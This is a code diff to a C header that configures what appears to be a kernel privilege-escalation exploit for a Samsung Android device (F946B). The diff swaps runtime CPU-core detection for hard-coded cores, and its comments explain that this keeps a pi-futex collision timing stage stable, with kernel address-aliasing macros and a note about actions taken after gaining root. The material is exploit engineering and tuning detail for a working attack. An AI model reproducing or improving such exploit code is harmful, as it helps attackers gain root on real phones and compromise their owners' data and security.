@@ -75,9 +75,15 @@
 #define KERNELSNITCH_MTE_ENABLED 0
 #endif
 #define MM_PARTIALS 5
-/* Time-sensitive choreography core: Cortex-X3 prime on SM8550-class SoCs
- * (auto-detected; was cpu0 = LITTLE before topology-aware pinning). */
-#define CORE affinity_timing_core()
+/* Choreography cores are COMPILE-TIME LITERALS on purpose. Device-verified
+ * on F946B: any topology probing / runtime core resolution in the payload
+ * path (sysfs reads, trial sched_setaffinity migrations before the timing
+ * window) destabilizes the pi-futex stage even when the final placement is
+ * identical. The futex-collision channel is calibrated to the LITTLE pair
+ * (0,1); the Cortex-X3 prime rejects affinity outright on this firmware
+ * (restricted-core EINVAL), so there is nothing faster to legally target.
+ * Background actors use src/affinity.h pin_perf_mask() AFTER root. */
+#define CORE 0
 #ifndef KSNITCH_COLLISIONS
 #define KSNITCH_COLLISIONS 4
 #endif
@@ -146,10 +152,7 @@
 #define P0_DATA_ALIAS_CONST(image_addr) \
   (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
 
-#define CONSUMER_CORE affinity_consumer_core()
-#ifndef SLIDE_WAITER_CORE
-#define SLIDE_WAITER_CORE affinity_waiter_core()
-#endif
+#define CONSUMER_CORE (CORE + 1)
 #define CONSUMER_MAX_CALLS 1
 #define PSELECT_ROUTE_NFDS 320
 #define PSELECT_CONSUMER_NICE 19
